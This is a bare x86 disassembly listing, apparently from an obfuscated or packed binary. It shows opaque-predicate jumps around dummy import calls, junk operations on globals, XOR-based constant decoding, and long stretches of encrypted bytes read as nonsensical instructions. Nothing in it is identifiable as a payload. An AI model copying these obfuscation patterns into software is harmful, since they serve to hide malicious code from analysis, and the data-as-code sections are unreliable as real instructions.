  41598d:	mov    bl,0xcb
  41598f:	xlat   BYTE PTR ds:[ebx]
  415990:	daa    
  415991:	pop    ebx
  415992:	xchg   ebx,eax
  415993:	hlt    
  415994:	mov    ebx,0x2ec95425
  415999:	xchg   edi,eax
  41599a:	inc    ecx
  41599b:	cmp    eax,0xa480dc17
  4159a0:	test   ebx,0xa3f077b4
  4159a6:	push   cs
  4159a7:	rcl    BYTE PTR [edx],1
  4159a9:	sub    ebx,esp
  4159ab:	fistp  WORD PTR [edx+0x37]
  4159ae:	es dec esi
  4159b0:	scas   eax,DWORD PTR es:[edi]
  4159b1:	inc    esi
  4159b2:	mov    DWORD PTR [edx],eax
  4159b4:	iret   
  4159b5:	mov    dh,0xcb
  4159b7:	fisttp DWORD PTR [ebx-0x4a21ccf]
  4159bd:	mov    al,ds:0x458b9f2b
  4159c2:	loopne 0x4159f7
  4159c4:	ror    BYTE PTR [ebx-0x2fdc23bb],1
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x42825b,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x428397,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x42822b,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x42818b,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x4282ef
  415a48:	cmp    DWORD PTR ds:0x42822b,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428ee4
  415a74:	mov    edi,DWORD PTR ds:0x4281bf
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x4281df
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x428177
  415a8f:	and    DWORD PTR ds:0x4283a3,edx
  415a95:	xor    DWORD PTR ds:0x428243,0x17b
  415a9f:	sbb    DWORD PTR ds:0x4282f7,ecx
  415aa5:	adc    DWORD PTR ds:0x42816b,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x428173
  415ac7:	xor    DWORD PTR ds:0x42829f,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x4281ef
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x4282ab
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x428383,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42824f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x4281cf
  415b25:	mov    edx,DWORD PTR ds:0x42821f
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x42838f,0x0
  415b3a:	not    DWORD PTR ds:0x428313
  415b40:	mov    DWORD PTR ds:0x42826b,0x4d0
  415b4a:	mov    DWORD PTR ds:0x428163,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x428373,0x25ca
  415b63:	cmp    DWORD PTR ds:0x42838f,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x42815b
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428e7c
  415b83:	add    DWORD PTR ds:0x42836b,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x42831f,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x4282eb
  415ba0:	adc    DWORD PTR ds:0x428327,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x42817f,0x0
  415bb5:	mov    DWORD PTR ds:0x428177,0x74bf
  415bbf:	mov    DWORD PTR ds:0x4282f7,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x42817f,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x428257
  415bef:	call   DWORD PTR ds:0x428e80
  415bf5:	sub    edi,DWORD PTR ds:0x4283a3
  415bfb:	sbb    DWORD PTR ds:0x428327,ecx
  415c01:	and    edx,DWORD PTR ds:0x428197
  415c07:	mov    edi,DWORD PTR ds:0x42823f
  415c0d:	and    DWORD PTR ds:0x42817b,edi
  415c13:	or     DWORD PTR ds:0x428173,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x4281a3
  415c23:	mov    edx,DWORD PTR ds:0x42832b
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x42836f,0x0
  415c38:	mov    DWORD PTR ds:0x42839b,ebx
  415c3e:	mov    DWORD PTR ds:0x42816f,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x42818b,edx
  415c4f:	cmp    DWORD PTR ds:0x42836f,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x42830b
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428dd0
  415c88:	mov    edi,DWORD PTR ds:0x4281c7
  415c8e:	mov    edx,DWORD PTR ds:0x42834f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x428327,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x42823f
  415cab:	mov    eax,ds:0x4223d8
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x4225f8
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x42838b,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x42827b
  415cd7:	mov    ebx,DWORD PTR ds:0x4283a3
  415cdd:	mov    DWORD PTR ds:0x428243,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x42837b,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x42838b,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428dd4
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x428267
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x42827f,0x428263
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x42830f,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x428327,0x0
  415d58:	mov    DWORD PTR ds:0x428283,0x5216
  415d62:	not    DWORD PTR ds:0x42825b
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x42827b,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x42829b,ebx
  415d82:	cmp    DWORD PTR ds:0x428327,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x4280bb
  415d94:	push   0x428069
  415d99:	call   DWORD PTR ds:0x428dd8
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x42827f
  415dab:	sbb    DWORD PTR ds:0x4283a3,edx
  415db1:	or     DWORD PTR ds:0x428383,ebx
  415db7:	sbb    DWORD PTR ds:0x4282a3,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x42831f,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x42815f,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x428157,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x42819b,0x428163
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x42819b,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x42836f,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x428277,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x4282a3,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42824f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x42827f,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x428307,0x42818f
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x428173,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x42831f,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x42818f,0x1988
  415e9d:	mov    DWORD PTR ds:0x428297,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x428173,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428ddc
  415ec4:	or     DWORD PTR ds:0x428233,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x42836b,0x174
  415ede:	mov    DWORD PTR ds:0x42838f,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x42838b
  415eee:	add    edx,DWORD PTR ds:0x42816f
  415ef4:	mov    DWORD PTR ds:0x42838b,edx
  415efa:	or     DWORD PTR ds:0x428377,ecx
  415f00:	mov    edx,DWORD PTR ds:0x428327
  415f06:	or     DWORD PTR ds:0x428287,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x428297,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x42831f,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x428153,0x0
  415f3b:	mov    DWORD PTR ds:0x428177,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x428377
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x428317,ebx
  415f59:	cmp    DWORD PTR ds:0x428153,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428ee8
  415f91:	xor    DWORD PTR ds:0x4283a7,edx
  415f97:	sbb    edi,DWORD PTR ds:0x428283
  415f9d:	sub    DWORD PTR ds:0x42823f,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x42837b
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x428323
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x428373,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x42818b,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x42818b
  415fdc:	add    DWORD PTR ds:0x428273,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x42823f,0x0
  415fec:	mov    DWORD PTR ds:0x428393,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x4283a7,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x428373,0x1cd3
  416015:	mov    DWORD PTR ds:0x42816f,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x42823f,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428eec
  416037:	add    DWORD PTR ds:0x428173,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x428317,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42824f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428247
  41605c:	adc    DWORD PTR ds:0x42826b,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x42839b,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x428307,0x42827f
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x42818f,0x0
  416089:	mov    DWORD PTR ds:0x428327,0x1e83
  416093:	mov    DWORD PTR ds:0x428383,edx
  416099:	movzx  ecx,WORD PTR ds:0x42825b
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x428193
  4160ad:	cmp    DWORD PTR ds:0x42818f,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428de0
  4160c6:	adc    DWORD PTR ds:0x42831b,edi
  4160cc:	or     DWORD PTR ds:0x42825b,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x42822f
  4160dc:	sub    DWORD PTR ds:0x42818b,ecx
  4160e2:	add    DWORD PTR ds:0x42827f,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x422558
  4160f5:	and    ecx,DWORD PTR ds:0x42826f
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x42837b,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x428393,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x42818b,0x0
  416120:	mov    DWORD PTR ds:0x428373,0x7b16
  41612a:	mov    DWORD PTR ds:0x42818f,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x42826b,0x5f2a
  416143:	cmp    DWORD PTR ds:0x42818b,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428ef0
  416159:	xor    DWORD PTR ds:0x428167,0x42815b
  416163:	sub    DWORD PTR ds:0x428153,0x42817f
  41616d:	sbb    DWORD PTR ds:0x42828f,0x428287
  416177:	and    DWORD PTR ds:0x42827f,0x56d1
  416181:	xor    DWORD PTR ds:0x42826b,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x42825f,0x42819b
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x42820f
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x428193,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x42818b,0x428267
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x42828b,0x42824b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x428317,0x42822b
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x428283,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	adc    ch,cl
  416311:	mov    DWORD PTR [esp+esi*8+0x0],edi
  416315:	push   ss
  416316:	sbb    BYTE PTR [ebx-0x29e7e7ec],bl
  41631c:	sbb    al,0xcd
  41631e:	fisub  WORD PTR [ebp+0x71]
  416321:	push   ebx
  416322:	dec    eax
  416323:	pop    ss
  416324:	add    eax,0x1508bd90
  416329:	sbb    DWORD PTR [ebx],0xdad603ed
  41632f:	sbb    BYTE PTR [edx-0x23],0xf6
  416333:	fstp   TBYTE PTR [eax-0x31]
  416336:	or     BYTE PTR [ebx+0x58],ch
  416339:	cmp    al,0x6a
  41633b:	daa    
  41633c:	cmp    ebp,DWORD PTR [esi+0x7b]
  41633f:	xor    al,0xee
  416341:	mov    dl,0xd7
  416343:	sub    eax,edx
  416345:	arpl   WORD PTR [esi-0x34e65dd4],dx
  41634b:	and    BYTE PTR [edx+0x4b07afce],0x0
  416352:	mov    BYTE PTR [ebp+0x4f],bl
  416355:	outs   dx,DWORD PTR ds:[esi]
  416356:	and    BYTE PTR [ebx-0xb06b47],al
  41635c:	int    0x9f
  41635e:	sbb    DWORD PTR [esi],ecx
  416360:	cli    
  416361:	cmp    al,ch
  416363:	lock frstor [ebx]
  416366:	mov    bh,0xbf
  416368:	xor    al,0xe8
  41636a:	fwait
  41636b:	mov    edi,0xa2646842
  416370:	pop    eax
  416371:	or     DWORD PTR [esi],edi
  416373:	xlat   BYTE PTR ds:[ebx]
  416374:	jae    0x41637d
  416376:	xchg   edi,eax
  416377:	lea    esi,[eax+0x4268b512]
  41637d:	call   0xbf55:0x82262dd8
  416384:	inc    esi
  416385:	mov    ecx,0x477c077a
  41638a:	nop
  41638b:	outs   dx,BYTE PTR ds:[esi]
  41638c:	or     bl,BYTE PTR [ecx+eiz*8-0x7ed8a5a6]
  416393:	fsub   QWORD PTR [ecx+0x5c]
  416396:	jnp    0x41638a
  416398:	cld    
  416399:	fldcw  WORD PTR [edx+0x459b3cfe]
  41639f:	aas    
  4163a0:	lods   al,BYTE PTR ds:[esi]
  4163a1:	and    eax,0x32d5482e
  4163a6:	mov    dh,0xdc
  4163a8:	shl    BYTE PTR [ebx+esi*8+0x7d946387],0x3d
  4163b0:	fiadd  WORD PTR [edi]
  4163b2:	sti    
  4163b3:	cwde   
  4163b4:	ins    DWORD PTR es:[edi],dx
  4163b5:	std    
  4163b6:	pop    edx
  4163b7:	lods   al,BYTE PTR ds:[esi]
  4163b8:	sub    eax,0x848852f5
  4163bd:	iret   
  4163be:	int3   
  4163bf:	add    ebx,DWORD PTR [eax]
  4163c1:	jle    0x41639b
  4163c3:	adc    DWORD PTR [eax],ecx
  4163c5:	dec    ebx
  4163c6:	add    BYTE PTR [edi+eiz*1+0x554a0129],cl
  4163cd:	clc    
  4163ce:	mov    ecx,0x2bb6afc2
  4163d3:	mov    ss,WORD PTR [ebx+0x7b]
  4163d6:	inc    esp
  4163d7:	xor    al,0xdc
  4163d9:	cmc    
  4163da:	mov    eax,0x119a4008
  4163df:	sahf   
  4163e0:	mov    ch,0xab
  4163e2:	jp     0x416370
  4163e4:	sbb    BYTE PTR [ebx-0x63],al
  4163e7:	pop    ebx
  4163e8:	jns    0x41642a
  4163ea:	mov    bl,bl
  4163ec:	scas   al,BYTE PTR es:[edi]
  4163ed:	mov    edi,DWORD PTR [eax+0x36]
  4163f0:	repnz pop ss
  4163f2:	dec    ebx
  4163f3:	cdq    
  4163f4:	mov    edx,0x2952db71
  4163f9:	jp     0x416475
  4163fb:	lods   al,BYTE PTR ds:[esi]
  4163fc:	iret   
  4163fd:	addr16 and esp,ebp
  416400:	dec    esp
  416401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416402:	add    al,0x3f
  416404:	inc    ebx
  416405:	in     eax,dx
  416406:	loope  0x4163ff
  416408:	out    0x11,eax
  41640a:	fisttp DWORD PTR [ecx+0x1e]
  41640d:	popf   
  41640e:	xor    DWORD PTR [edi],esi
  416410:	rcl    DWORD PTR [ebp+0x5d58a8d],0xc2
  416417:	push   cs
  416418:	out    dx,eax
  416419:	mov    eax,DWORD PTR [edx]
  41641b:	jns    0x416445
  41641d:	sbb    al,0xfb
  41641f:	mov    al,ds:0x4d73d879
  416424:	sbb    DWORD PTR [ebp-0x58],0x2b6f575d
  41642b:	sar    cl,1
  41642d:	lea    ebx,[ebp+ebx*2-0x60]
  416431:	sub    dh,BYTE PTR [edi]
  416433:	pop    eax
  416434:	cdq    
  416435:	call   0xe07c6b28
  41643a:	retf   0x9b4b
  41643d:	test   ecx,esi
  41643f:	ins    DWORD PTR es:[edi],dx
  416440:	stos   BYTE PTR es:[edi],al
  416441:	nop
  416442:	mov    bl,0x95
  416444:	js     0x416430
  416446:	sub    DWORD PTR [edi],esp
  416448:	adc    eax,0x3351ab79
  41644d:	xchg   ebp,eax
  41644e:	xor    al,0x0
  416450:	mov    al,ds:0xfffe8183
  416455:	mov    esi,0x4e9130d
  41645a:	dec    esp
  41645b:	xor    eax,0x11800b76
  416460:	push   cs
  416461:	or     ebp,DWORD PTR [esi]
  416463:	mov    bh,0x35
  416465:	mov    ecx,0x730d09f0
  41646a:	aaa    
  41646b:	adc    BYTE PTR [esi],0x84
  41646e:	(bad)  
  41646f:	mov    esi,0xf5fccd76
  416474:	test   eax,0x1fddce2b
  416479:	loop   0x416487
  41647b:	inc    ecx
  41647c:	mov    edi,0x8187ec7a
  416481:	mov    eax,?
  416483:	jo     0x41644c
  416485:	jne    0x41646e
  416487:	cli    
  416488:	inc    esp
  416489:	lea    ebx,[ebp+0x63454364]
  41648f:	ja     0x416425
  416491:	mov    ch,0x2f
  416493:	lods   eax,DWORD PTR ds:[esi]
  416494:	lea    edx,[edx-0x512d8584]
  41649a:	pushf  
  41649b:	xor    al,0x51
  41649d:	jge    0x41650e
  41649f:	push   esi
  4164a0:	dec    esi
  4164a1:	xchg   edi,eax
